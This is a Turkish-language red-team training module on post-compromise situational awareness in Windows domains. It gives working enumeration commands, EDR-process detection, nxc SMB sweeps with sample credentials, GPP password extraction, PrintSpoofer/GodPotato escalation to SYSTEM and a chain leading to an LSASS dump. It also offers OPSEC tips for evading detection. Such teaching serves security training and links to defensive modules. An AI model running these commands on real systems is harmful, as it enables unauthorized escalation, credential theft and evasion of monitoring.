## 1. Kavramsal Temel — Neden Var?

İlk kimliği/shell'i elde ettin. Şimdi en tehlikeli an: **acele etmek.** Deneyimli operatör önce **nerede olduğunu** anlar. Kilit ilke:

> **"Bir tuşa basmadan önce, bulunduğun yeri tanı." Situational awareness = bulunduğun kullanıcının/makinenin yetkilerini, ağdaki konumunu, EDR/AV varlığını, hangi tier'da olduğunu (Tier 0/1/2) haritalamak. Yanlış bir komut (gürültülü tarama, yanlış makineye PtH) tüm operasyonu yakar.**

Bu aşama sömürü değil, **envanterdir**: Ben kimim? Yerel admin miyim? Domain'de hangi gruplardayım? Bu makinede hangi kimlikler cache'li? EDR ne? Buradan nereye gidebilirim?

**Analoji:** Bir binaya sızdın. Işıkları yakmadan önce elindeki kartın hangi kapıları açtığını, kameraların yerini ve çıkışları öğrenirsin. Panikle koşarsan alarma yakalanırsın.

## 2. Teknik Derinlik — Durum Tespitinin Katmanları

### 2.1 Beş soru çerçevesi

```
   ┌─────────────────────────────────────────────────────────────┐
   │ 1) BEN KİMİM?     whoami /all → SID, gruplar, ayrıcalıklar    │
   │ 2) NEREDEYIM?     hostname, domain, IP, hangi subnet/site     │
   │ 3) NE YETKİM VAR? yerel admin? SeDebug/SeImpersonate? UAC?    │
   │ 4) KİM BURADA?    cached creds, oturumlar, çalışan servisler  │
   │ 5) BENİ KİM İZLİYOR? EDR/AV süreçleri, Sysmon, WEF abonelik   │
   └─────────────────────────────────────────────────────────────┘
```

### 2.2 Ayrıcalık (privilege) → sömürü eşlemesi

`whoami /priv` çıktısındaki bazı ayrıcalıklar doğrudan yükseltme kapısıdır:

| Ayrıcalık | Ne sağlar | Teknik |
|-----------|-----------|--------|
| `SeImpersonatePrivilege` | Token taklidi | **Potato** ailesi (PrintSpoofer/GodPotato) → SYSTEM |
| `SeDebugPrivilege` | Süreç belleği oku | LSASS dump → [Modül 03.2](../Modul_03_Kimlik_Bilgisi_Erisimi/) |
| `SeBackupPrivilege` | Tüm dosyaları oku | SAM/SYSTEM hive / NTDS kopyala |
| `SeLoadDriverPrivilege` | Sürücü yükle | BYOVD → kernel |

### 2.3 Token, integrity level ve UAC

Windows'ta her süreç bir **access token** taşır; token'ın **integrity level**'ı yetki sınırını belirler:

```
   Integrity Level:  Low  <  Medium  <  High  <  System
   Sıradan kullanıcı süreci      → Medium
   "Yönetici olarak çalıştır"     → High  (UAC yükseltmesi)
   SYSTEM servisleri              → System

   UAC:  admin grubundaki kullanıcı bile varsayılan MEDIUM token'la başlar
         (split-token). High'a çıkmak = UAC bypass veya yükseltme gerekir.
```

> **SeImpersonate → SYSTEM (Potato ailesi):** Bir servis hesabı (IIS/MSSQL/WinRM) genelde `SeImpersonatePrivilege` taşır. Bu, "başka bir güvenlik bağlamını taklit et" hakkıdır. Potato saldırıları (PrintSpoofer, GodPotato, EfsPotato) bir SYSTEM sürecini sana kimlik doğrulatmaya kandırıp o token'ı **taklit ederek** SYSTEM'e çıkar. `whoami /priv`'de `SeImpersonatePrivilege = Enabled` görmek = "yerel SYSTEM bir komut uzaklıkta" demektir.

### 2.4 Tier farkındalığı (yakalanmamak için)

Bulunduğun makinenin **hangi tier'da** olduğunu anla ([Blue 05.1 — Tier Model](../../2-Blue_Team/Modul_05_Yetki_ve_ACL_Sikilastirma/05.1_Admin_Tier_Model.md)): Tier 0 (DC/AD yönetim) makinelerinde EDR ve izleme en yoğundur; Tier 2 (kullanıcı iş istasyonu) daha gevşektir. Bir Tier 0 admin kimliği bir Tier 2 makinede cache'liyse → altın; ama o makinede gürültü yaparsan yakalanırsın.

> **Tier ihlali avı:** En değerli bulgu, bir **Tier 0 kimliğinin Tier 2 makinede oturum bırakmış** olmasıdır (yanlış yönetim hijyeni). Bunu `qwinsta`/`klist`/`HasSession` ([01.2](../Modul_01_Kesif_ve_Numaralandirma/01.2_SharpHound_ve_BloodHound.md)) ile ara. Bulursan → LSASS ([Modül 03](../Modul_03_Kimlik_Bilgisi_Erisimi/)) → Tier 0 ele geçer.

## 3. Pratik Uygulama — Çok Araçlı

### 3.1 Windows-yerleşik durum tespiti (LOLBin, en sessiz)

```cmd
:: kim ve ne yetkiyle
whoami /all                    :: SID, gruplar, ayrıcalıklar (SeImpersonate?)
hostname & ipconfig /all       :: konum, DNS sunucusu (= DC ipucu)
net localgroup administrators  :: yerel admin miyim?
net user %username% /domain    :: domain grupları
klist                          :: elimdeki Kerberos biletleri
:: kim burada oturum açtı / açmış (avlanacak kimlikler)
query user
qwinsta
:: EDR/AV tespiti (beni kim izliyor)
tasklist /svc | findstr /i "sense csfalcon carbonblack cylance MsMpEng sysmon"
sc query windefend
```

### 3.2 WinPEAS / Seatbelt (otomatik triyaj)

```cmd
:: WinPEAS — yerel yükseltme yollarını otomatik tarar (gürültülü, dikkatli kullan)
winPEASx64.exe quiet cmd fast

:: Seatbelt (.NET) — güvenlik-odaklı durum tespiti, bellek-içi çalıştırılabilir
Seatbelt.exe -group=all
Seatbelt.exe TokenPrivileges LocalGroupMembers CredEnum WindowsDefender
```

### 3.3 Uzaktan (Linux → domain) durum tespiti

```bash
# nxc ile: bu kimlik nerede yerel admin? (yanal hareket haritası)
nxc smb 10.10.10.0/24 -u jsmith -p 'Welcome1' --loggedon-users
nxc smb 10.10.10.0/24 -u jsmith -p 'Welcome1'          # (Pwn3d! = yerel admin)

# hangi paylaşımlara erişebiliyorum (SYSVOL'de GPP parolası olabilir)
nxc smb 10.10.10.5 -u jsmith -p 'Welcome1' --shares
nxc smb 10.10.10.5 -u jsmith -p 'Welcome1' -M gpp_password    # cPassword avı
```

**Örnek `nxc` çıktısı (yanal hareket ipucu):**
```
SMB  10.10.10.42  445  WS042   [+] corp.local\jsmith:Welcome1 (Pwn3d!)   ← burada yerel admin!
SMB  10.10.10.60  445  SRV60   [+] corp.local\jsmith:Welcome1
```

### 3.4 SYSVOL / GPP cPassword (klasik hızlı kazanç)

```bash
# SYSVOL'deki Groups.xml içindeki AES-şifreli (herkese açık anahtar!) parolaları çek+çöz
nxc smb 10.10.10.5 -u jsmith -p 'Welcome1' -M gpp_password
# veya:
Get-GPPPassword -Server dc01.corp.local        # PowerSploit
```

### 3.5 SeImpersonate → SYSTEM (Potato) uygulaması

```cmd
:: whoami /priv → SeImpersonatePrivilege Enabled ise:
PrintSpoofer.exe -i -c cmd                       :: spooler'ı kandır → SYSTEM shell
GodPotato.exe -cmd "cmd /c whoami"               :: DCOM/OXID → SYSTEM (modern)
:: sonuç: nt authority\system
```

### 3.6 Gerçek-dünya foothold zinciri

```
   1) Web servis hesabı (svc-web) ile shell aldın → whoami /priv: SeImpersonate ✓
   2) tasklist /svc → EDR yok, sadece Defender → PrintSpoofer güvenli
   3) PrintSpoofer -i -c cmd → SYSTEM
   4) qwinsta → 'dadmin' RDP oturumu AKTİF (Tier 0 kimliği burada!)
   5) SYSTEM olarak LSASS dump → Modül 03 → dadmin bileti → domain sonu
   Not: 2. adımda EDR olsaydı, LSASS'a dokunmadan önce AMSI/ETW bypass (Modül 10.4)
```

**OPSEC notları:**
- **Önce yerleşik (LOLBin) araçlarla** durumu tanı; WinPEAS gibi bütünsel tarayıcılar disk/kayıt üzerinde yoğun gürültü ve EDR davranış tespiti üretir. Bunları yalnızca EDR yoksa veya bellek-içi çalıştırarak kullan.
- `nxc ... --pwned/loggedon` taramaları kısa sürede çok 4624 üretir — [Blue 04.1](../../2-Blue_Team/Modul_04_Yanal_Hareket_Tespiti/04.1_Anormal_Oturum_Acma_Analizi.md) bunu "yatay tarama" olarak yakalar. Yavaşlat, hedefli tara.
- **EDR'ı tanımadan LSASS'a dokunma.** [Modül 03](../Modul_03_Kimlik_Bilgisi_Erisimi/)'e geçmeden önce EDR/AV'yi (`tasklist /svc`, Seatbelt `WindowsDefender`) sapta; koruma varsa yöntem seç (dump tekniği/AMSI bypass → [Modül 10.4](../Modul_10_Trust_Forest_ve_Hibrit_Saldirilar/)).
- GPP cPassword hâlâ eski ortamlarda bulunur (MS14-025 ile kapatıldı ama artık dosyalar kalabilir) — hızlı ve düşük-iz bir kazançtır.
